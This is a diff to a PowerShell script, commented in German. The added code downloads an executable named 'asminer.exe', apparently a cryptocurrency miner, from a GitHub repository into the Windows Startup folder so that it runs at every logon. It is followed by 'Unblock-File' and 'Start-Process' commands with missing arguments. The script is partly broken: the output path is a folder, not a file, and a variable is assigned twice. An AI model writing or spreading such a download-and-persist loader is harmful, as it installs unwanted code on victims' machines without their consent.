@@ -1,3 +1,16 @@
-https://github.com/Lorcan84/test/raw/main/asminer.exe
+$startupPath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
+# URL der Datei, die heruntergeladen werden soll
+$url = "https://github.com/Lorcan84/test/raw/main/asminer.exe"
+$startupPath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
+
+# Pfad, wo die Datei gespeichert werden soll
+$output = $startupPath
+
+# Herunterladen der Datei
+Invoke-WebRequest -Uri $url -OutFile $output
+
+Write-Output "Datei wurde erfolgreich heruntergeladen und gespeichert unter $output"
+
+
 Unblock-File -Path 
 Start-Process -Filepath
